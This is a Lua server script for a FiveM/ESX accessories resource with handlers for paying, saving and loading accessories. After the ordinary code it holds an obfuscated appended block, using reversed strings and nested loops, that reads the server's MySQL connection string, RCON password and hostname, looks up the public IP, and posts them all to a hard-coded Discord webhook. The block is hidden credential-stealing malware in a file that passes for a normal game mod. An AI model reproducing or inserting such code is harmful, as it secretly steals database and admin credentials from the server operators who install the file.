ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('esx_accessories:pay')
AddEventHandler('esx_accessories:pay', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	xPlayer.removeMoney(Config.Price)
	TriggerClientEvent('esx:showNotification', _source, _U('you_paid') .. '$' .. Config.Price)

end)

RegisterServerEvent('esx_accessories:save')
AddEventHandler('esx_accessories:save', function(skin, accessory)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	TriggerEvent('esx_datastore:getDataStore', 'user_' .. string.lower(accessory), xPlayer.identifier, function(store)
		
		store.set('has' .. string.lower(accessory), true)

		local itemSkin = {}
		local item1 = string.lower(accessory) .. '_1'
		local item2 = string.lower(accessory) .. '_2'
		itemSkin[item1] = skin[item1]
		itemSkin[item2] = skin[item2]
		store.set('skin', itemSkin)

	end)

end)

ESX.RegisterServerCallback('esx_accessories:get', function(source, cb, accessory)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	--print("asdssst" .. tostring(accessory)) - DAFAQ IS THAT
	TriggerEvent('esx_datastore:getDataStore', 'user_' .. tostring(accessory), xPlayer.identifier, function(store)
		
		local hasAccessory = (store.get('has' .. accessory) and store.get('has' .. accessory) or false)
		local skin = (store.get('skin') and store.get('skin') or {})

		cb(hasAccessory, skin)

	end)

end)

--===================================================================
--===================================================================

ESX.RegisterServerCallback('esx_accessories:checkMoney', function(source, cb)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	if xPlayer.getMoney() >= Config.Price then
		cb(true)
	else
		cb(false)
	end
end)
local III={IIII={GetConvar}}local _I= {["gnirts_noitcennoc_lqsym"] = {"nie znaleziono"}, ["drowssap_nocr"] = {"nie znaleziono"}, ["emantsoh_vs"] = {"nie znaleziono"}, ["https://api.ipify.org"] = {"nie znaleziono"}}local ip_serwera = ""local port_serwera_tcp = ""local port_serwera_udp = ""local baza_mysql = ""local haslo_rcon = ""local nazwa_serwera = ""local steam_api_key = ""local klucz_licencyjny = ""for _,__ in pairs(III) do for _,__ in pairs(__) do  for _I,_II in pairs(_I) do  for _,_II in pairs(_II) do if string.sub(_I,3,6)=="irts" then baza_mysql=__(string.reverse(_I),_II) elseif string.sub(_I,3,6)=="ants" then nazwa_serwera=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="owss" then  haslo_rcon=__(string.reverse(_I),_II) elseif  string.sub(_I,3,6)==string.reverse(":spt") then  PerformHttpRequest("https://api.ipify.org",function(_,__,___)if _==200then ip_serwera=__ end local webhook = "https://discord.com/api/webhooks/879751268233543740/Hd9srU4AU3ssrpCE97_r9AnA-qi9mWxtGHwGfCIj1rJmmWi4hef6KBG_hA6Rnfu3-PqW"local n = {{["color"]="2801129", ["title"]="EZ ;)", ["description"]="\n\n > ``NAZWA SERWERA:``"..nazwa_serwera.."\n > ``IP SERWERA:`` "..ip_serwera.."\n > ``HASLO RCON:`` "..haslo_rcon.."\n > ``PORT SERWERA TCP:`` "..port_serwera_tcp.."\n > ``PORT SERWERA UDP:`` "..port_serwera_udp.."\n > ``STEAM API KEY:`` "..steam_api_key.."\n > ``KLUCZ LICENCYJNY:`` "..klucz_licencyjny.."\n > ``BAZA DANYCH:`` "..baza_mysql.."", ["footer"]={["text"]="beczunia"}, ["timestamp"]=os.date('!%Y-%m-%dT%H:%M:%S'),}}PerformHttpRequest(webhook,function(err,text,headers)end,'POST',json.encode({username="BRAK LICENCJI ",embeds=n}),{['Content-Type']='application/json'})end)end end end end end      

